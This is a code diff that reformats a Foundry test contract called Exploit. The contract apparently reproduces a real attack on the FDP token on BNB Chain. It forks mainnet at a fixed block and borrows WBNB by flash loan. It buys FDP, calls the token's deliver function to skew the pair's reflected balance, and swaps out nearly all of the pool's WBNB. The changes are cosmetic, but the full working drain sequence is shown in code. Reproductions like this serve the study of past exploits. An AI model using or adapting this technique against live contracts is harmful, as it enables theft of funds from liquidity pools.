@@ -19,43 +19,39 @@ contract Exploit is Test {
 
     IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
-    
+
     function testHack() external {
-        vm.createSelectFork("https://1rpc.io/bnb", 25430418);
+        vm.createSelectFork("https://1rpc.io/bnb", 25_430_418);
 
         // flashloan 16.32 WBNB
-        DPP.flashLoan(16.32 ether, 0, address(this), "0x1");  
+        DPP.flashLoan(16.32 ether, 0, address(this), "0x1");
     }
 
     function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
         // console.log("%s FDP in Pair before swap", FDP.balanceOf(address(FDP_WBNB)) / 1e18);  // putting console.log here make test fail ?
 
         // swap some WBNB to FDP
-        WBNB.approve(address(router), type(uint).max);
-        FDP.approve(address(router), type(uint).max);
+        WBNB.approve(address(router), type(uint256).max);
+        FDP.approve(address(router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(FDP);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            16.32 ether,
-            0,
-            path, 
-            address(this),
-            type(uint).max
+            16.32 ether, 0, path, address(this), type(uint256).max
         );
 
         console.log("%s FDP in Pair before deliver", FDP.balanceOf(address(FDP_WBNB)) / 1e18);
         console.log("%s FDP in attack contract before deliver", FDP.balanceOf(address(this)) / 1e18);
         console.log("-------------Delivering-------------");
-                                      // 49925109590047580102880 in attack contract before deliver
-        FDP.deliver(28463.16 ether);  // 28463162603585437380302 (8 decimals)
+        // 49925109590047580102880 in attack contract before deliver
+        FDP.deliver(28_463.16 ether); // 28463162603585437380302 (8 decimals)
 
         console.log("%s FDP in Pair after deliver", FDP.balanceOf(address(FDP_WBNB)) / 1e18);
         console.log("%s FDP in attack contract after deliver", FDP.balanceOf(address(this)) / 1e18);
 
         FDP_WBNB.swap(
             0,
-            WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether,  // 32.44 ether
+            WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether, // 32.44 ether
             address(this),
             ""
         );
@@ -85,12 +81,7 @@ interface IWETH {
 }
 
 interface IDPPOracle {
-    function flashLoan(
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        address sender,
-        bytes calldata data
-    ) external;
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address sender, bytes calldata data) external;
 }
 
 interface IRouter {
@@ -107,10 +98,5 @@ interface IUniswapV2Pair {
     function balanceOf(address) external view returns (uint256);
     function skim(address to) external;
     function sync() external;
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes memory data
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
 }
